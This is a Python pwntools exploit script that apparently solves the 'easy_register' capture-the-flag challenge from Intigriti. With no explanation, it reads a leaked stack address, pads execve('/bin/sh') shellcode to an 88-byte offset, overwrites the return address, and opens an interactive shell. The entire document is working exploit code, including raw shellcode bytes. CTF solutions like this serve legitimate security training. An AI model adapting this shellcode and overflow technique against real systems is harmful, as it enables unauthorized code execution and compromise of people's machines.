from pwn import *

elf = ELF("./easy_register")
context.binary = elf
context.terminal = ["x-terminal-emulator", "-e"]
#libc = ELF('./libc.so.6',checksec=False)

if args.GDB:
    p = gdb.debug(elf.path,gdbscript = """
    init-pwndbg
    """)
else:
    p = process(elf.path)


#p = remote("easyregister.ctf.intigriti.io" ,777)


offset = 88

p.recvuntil(b'at ')
leak = int(p.recvuntil(b'.\n').decode("utf-8").strip('.\n'),16)

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = b'A'*(offset - len(shellcode))


payload = flat([
    shellcode,
    payload,
    leak
])

p.sendlineafter(b'>', payload)
print("\n==========================")
print("Leak: " + hex(leak))
print("==========================\n")
p.interactive()
